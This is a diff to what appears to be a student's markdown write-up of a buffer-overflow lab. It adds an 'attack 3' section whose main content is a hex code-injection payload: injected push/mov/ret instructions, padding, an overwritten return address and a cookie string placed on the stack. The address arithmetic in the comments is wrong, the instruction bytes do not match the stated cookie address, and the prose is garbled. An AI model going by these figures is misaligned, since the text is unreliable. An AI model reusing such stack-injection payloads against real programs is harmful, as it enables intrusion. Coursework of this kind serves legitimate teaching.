@@ -132,5 +132,23 @@ ec 17 40 00 c3 00 00 00
 ```
 
 In the code, it will return to the top of the stack. Then it will 
-execute the hack code. The `edi` will be like the cook,and it will be push 
-into the stack. 
+execute the hack code. The `edi` will be like the cookie,and it will be push 
+into the stack.
+
+# The attack 3
+
+In the attack 3, it use the function hexmatch, so the stack will be changed. 
+If you storage the data of the cookie in the stack place allcated by the getbuf
+will be changed, so we need to palce the cookie into the older place. 
+
+```c
+ff 34 25 fa 18 40 00 48 
+c7 c7 a8 1d 56 05 c3 00  <<== top of the stack (0x5561dc78)
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00 <<== ret 
+35 39 62 39 39 37 66 61 <<== cookie (0x5561dc78 + 30 = 0x5561da8)  
+```
+
+
